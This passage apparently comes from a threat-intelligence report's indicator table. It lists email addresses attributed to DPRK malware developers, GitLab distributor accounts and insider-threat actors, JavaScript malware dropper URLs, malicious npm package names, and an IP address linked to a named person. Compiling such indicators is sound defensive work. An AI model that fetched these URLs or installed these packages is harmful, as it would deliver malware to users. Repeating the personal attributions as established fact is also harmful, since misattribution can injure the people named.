| `roman.ulanski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `stefan.moleski@mail.io` | email | malware | N/A | N/A | Used for malware distribution on freelance developer platforms | Year in Review |
| `taraslysenko@mail.io` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `corresol28@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `corresol28@outlook.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `paniker1110@outlook.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `walterjgould77@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `supernftier@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `bohuslavskyir@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `artizjusz11@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `bartonfratz@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `cryptodev26@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `deinsulabasil@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `elsaadanifaiek@hotmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `felipe.debarros@hotmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `geordiecuppaidge684@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `greatbusinessman517@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `jhmnuykbvgftrss@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `kainmcguire@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `kimberlysunshine137@yahoo.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `konovalov1256@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `kvashinalexander@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `markstevemark85@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `oleksandrbokii963@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `paniker1110@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `rubenbolanos19733@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `simpsonkeith686@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `sonniehutley5@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `tagi238761@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `vlulepet9@gmail.com` | email | malware | N/A | N/A | DPRK malware developer accounts | Year in Review |
| `cnova.business.en@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `danielmcevily.business918@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jaimetru003@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `daysabethtederstz7533@hotmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `thiagocosta199295@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `cptrhzv09@hotmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `chainsaw1107@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `mutsabsaskajgig0f@outlook.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `snowl3784@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `dieterwang@proton.me` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `cesarpassos4808@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `lazar.master.0204@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `lujancamryn405@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `harryjason19880502@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `fraserhutchison1@hotmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `stovbanoleksandr14@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `ramirezhector9299@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `mimoriokamoto@gmail.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `wilson.wen2145@outlook.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jasonfissionawgyi08293@outlook.com` | email | malware | N/A | December 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `olelangaard9@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `mirandacunningham1993@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jerryjames1997@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `caryphillips.business727@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `soft.business1103@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `soft.business1024@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `soft.business1020@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `soft.business0987@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `alphabrownsapon70555@hotmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `welbykchamu4i72@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `eron4236@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `reddixyxzh551438@hotmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `soft.business1112@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `richardcook.business93@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jamesgolden198852@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `erik423131@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `alfredogomez1984126@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jasonharris198852@gmail.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `xavieryetikqpir36636@outlook.com` | email | malware | N/A | November 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `marcello.armand.tf7@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `gabriel.sanchez255@outlook.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `aronlin712@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `rickcarr1014@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `sallydunnet.business1016@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `dr.md.hubert.business916@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `tommyrole0301@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jbutton717@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `lilian.rodrigues.re@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `andrewtilley.us@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `davidaheld.manager@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `lovelysong0209@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `moreandmore082@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `meirjacob727@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `harry.work206@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `abdelrahman5520032019@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `karenhooi.cpa.cga.business1016@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `craigsmith93.business@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `paulodiego0902@outlook.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `faelanholtmdjld41341@outlook.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `encar.geric727510@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `irynalavreniuk38@gmail.com` | email | malware | N/A | October 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `melnikoleg995@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `opalinsigniagyprt29567@hotmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `thorneaustinngzsz52979@outlook.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `joshuataub3@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `itspeterszabo@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `xylosmontagueujsvt83787@hotmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `ivicastojadin488@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `seed1996017@outlook.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `bryandev0418@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `ruslanlarionov77@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `superdev@outlook.com.au` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `cristhianmartinezrom7@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `natasa.golubovic90@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `weili.walk@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `afaq91169@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `mahmodghnaj1@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `look.as.united@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `rochaevertondev@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `tabishhassan01998@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `temorexviashvili17@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `vovalishcn77@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `seed1996015@outlook.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `suryaedg88@hotmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `maurostaver9@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `pleasemeup214@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `vitalii214.ilnytskyi@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `reactangulardev@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `skyearth711@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `migueljose81234@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `seed1996010@outlook.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `blackwang104@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `kagan.hungri@gmail.com` | email | malware | N/A | September 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `littebaby232355@gmail.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `kenycarl92@gmail.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `arnas.tf7@gmail.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `nandawsu58@hotmail.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `magalhaesbruno236@gmail.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `martytowne03@gmail.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `peter@trovastra.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `martinez@trovastra.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `peterforward@trovastra.com` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `rick.cto@dantelabs.us` | email | malware | N/A | August 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `tomgleeson92@outlook.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `huqyyitizomu@hotmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `tracykevin5590@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `seniorsky92@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `meftaht531@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `tapiasamjann@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `johnwatson2327a@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `donald.edler0626@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `chrisritter5272@outlook.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `hs8179189@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `dredsoft@proton.me` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `bloxdev1999@outlook.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `star712418@gmail.com` | email | malware | N/A | July 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jackson.murray.tf7@gmail.com` | email | malware | N/A | June 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `hudsonramsey107@outlook.com` | email | malware | N/A | June 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `samjanntapia@gmail.com` | email | malware | N/A | June 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `dyup58725@gmail.com` | email | malware | N/A | June 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `davidfernandez420@outlook.com` | email | malware | N/A | May 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `scottdavis8188@gmail.com` | email | malware | N/A | May 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `samjannt1211@gmail.com` | email | malware | N/A | April 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `ahmed03010229@gmail.com` | email | malware | N/A | April 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `hidranomagica@outlook.com` | email | malware | N/A | March 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `jackson.blau.eth@gmail.com` | email | malware | N/A | February 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `agne09541@gmail.com` | email | malware | N/A | February 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `antontarasiuk0512@gmail.com` | email | malware | N/A | February 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `michael.dilks8500@gmail.com` | email | malware | N/A | January 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `ignacioquesada127@gmail.com` | email | malware | N/A | January 2025 | DPRK malware distributor GitLab.com account | Year in Review |
| `http://chainlink-api-v3.cloud/api/service/token/3ae1d04a7c1a35b9edf045a7d131c4a7` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `http://chainlink-api-v3.cloud/api/service/token/792a2e10b9eaf9f0a73a71916e4269bc` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `http://chainlink-api-v3.com/api/service/token/1a049de15ad9d038a35f0e8b162dff76` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `http://chainlink-api-v3.com/api/service/token/7d6c3b0f7d1f3ae96e1d116cbeff2875` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `http://chainlink-api-v3.com/api/service/token/b2040f01294c183945fdbe487022cf8e` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `http://openmodules.org/api/service/token/f90ec1a7066e8a5d0218c405ba68c58c` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `http://w3capi.marketing/api/v2/node/d6a8d0d14d3fbb3d5e66c8b007b7a2eb` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/106` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/212` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/81` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/823` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api-server-mocha.vercel.app/api/ipcheck-encrypted/99` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.mocki.io/v2/8sg8bhsv/tracks/errors/665232` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/159a15993f79c22e8ff6` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/62755a9b33836b5a6c28` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/b1f111907933b88418e4` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/b68a5c259541ec53bb5d` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/c82d987dd2a0fb62e87f` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/d1ef256fc2ad6213726e` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/d4dfbbac8d7c44470beb` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/e6a6bfb97a294115677d` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/f4be0f7713a6fcdaac8b` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://api.npoint.io/f96fb4e8596bf650539c` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://astraluck-vercel.vercel.app/api/data` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://bs-production.up.railway.app/on` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://getApilatency.onrender.com/checkStatus` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://getpngdata.vercel.app/api/data` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://googlezauthtoken.vercel.app/checkStatus?id=S,T` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://ip-api-test.vercel.app/api/ip-check-encrypted/3aeb34a38` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://ip-check-server.vercel.app/api/ip-check-encrypted/3aeb34a37` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/4NAKK` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/8RLOV` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/CNMYL` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/DMVPT` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/E4YPZ` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/E7GKK` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/FM8D6` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/GLGT4` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/L4T7Y` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/PCDZO` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/PQPTZ` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/WCXNT` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/XRGF3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jsonkeeper.com/b/XV3WO` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://jwt-alpha-woad.vercel.app/api` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://metric-analytics.vercel.app/api/getMoralisData` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://pngconvert-p0kl4fodi-jhones-projects-f8ddbcbe.vercel.app/api` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/linux?flag=3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/linux?flag=5` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/linux?flag=8` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/mac?flag=3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/mac?flag=5` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/mac?flag=8` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/windows?flag=3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/windows?flag=5` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/windows?flag=5` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-config-settings.vercel.app/settings/windows?flag=8` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load-config.vercel.app/settings/linux?flag=3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load-config.vercel.app/settings/mac?flag=3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load-config.vercel.app/settings/windows?flag=3` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/linux?flag=2` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/linux?flag=4` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/linux?flag=9` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/mac?flag=2` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/mac?flag=4` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/mac?flag=9` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/windows?flag=2` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/windows?flag=4` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://vscode-load.vercel.app/settings/windows?flag=9` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://web3-metric-analytics.vercel.app/api/getMoralisData` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `https://zone-api-navy.vercel.app/api/ip-check/99` | url | malware | N/A | N/A | JavaScript malware dropper URL | Year in Review |
| `passport-google-auth-token` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `dotenv-extend` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `tailwindcss-animation-advanced` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `seeds-random` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `chai-jsons` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `dotenv-intend` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `preset-log` | npm package | malware | N/A | N/A | Malicious NPM dependency used to deliver malware | Year in Review |
| `111.197.183.74` | ipv4 | insider | October 2025 | October 2025 | Originating IP address of Kil-Nam Kang | 1 |
| `alancdouglas@googlemail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `alphatech1010@outlook.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `amitnyc007@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `anniegirl2023@163.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `appyleonardo77@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `awmango123@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `bowavelink@163.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `cpduran0622@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `docker1001@outlook.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `elvialc620@163.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `emilyvanessaaa@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `enrique122528@hotmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `erasmusmadridtrops@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `ericdoublin1111@yahoo.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `eruqulpuaro@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `eruqulpuaro@hotmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `eruqulpuaro1@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `eruqulpuaro1@hotmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `fangshan2019@hotmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `goldstar0906@outlook.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `gtracks.onelink@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `happycoder1111@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `happyleonardo77@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `hittapa9@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `housinginmadrid@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `imadjeghalef@hotmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `imranwork44@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
| `indulgenight@gmail.com` | email | insider | N/A | N/A | Threat actor-controlled email | 1 |
